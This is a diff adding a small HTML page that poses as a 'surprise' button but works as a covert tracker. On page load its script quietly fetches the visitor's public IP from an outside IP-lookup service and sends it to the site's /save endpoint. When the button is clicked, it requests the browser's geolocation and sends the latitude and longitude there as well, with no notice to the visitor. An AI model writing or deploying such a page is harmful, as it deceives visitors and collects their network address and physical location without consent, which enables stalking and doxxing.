@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      section {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+    </style>
+  </head>
+
+  <body style="height: 30em">
+    <section>
+      <button onclick="getLocation()">Click The button for supprise</button>
+
+      <!-- <p id="demo"></p> -->
+    </section>
+    <script>
+      user_location();
+      var ip;
+      function user_location() {
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+            console.log(this.responseText);
+            ip = this.responseText;
+            fetch(`/save?geo=${""}&&ip=${JSON.stringify(ip)}`)
+              .then(() => {})
+              .catch((err) => console.log(err));
+          }
+        };
+        xhttp.open("GET", "//api.ipify.org?format=json", true);
+        xhttp.send();
+      }
+      var x = document.getElementById("demo");
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              console.log(pos);
+              showPosition(pos, ip);
+            }
+            // showPosition(pos, ip)
+          );
+        } else {
+          x.innerHTML = "Geolocation is not supported by this browser.";
+        }
+      }
+
+      function showPosition(position, data) {
+        // x.innerHTML =
+        //   "Latitude: " +
+        //   position.coords.latitude +
+        //   "<br>Longitude: " +
+        //   position.coords.longitude;
+        let str = position.coords.latitude + "." + position.coords.longitude;
+        console.log(`${str},${data}`);
+        fetch(`/save?geo=${str}&&ip=${JSON.stringify(data)}`)
+          .then(() => {})
+          .catch((err) => console.log(err));
+      }
+    </script>
+  </body>
+</html>
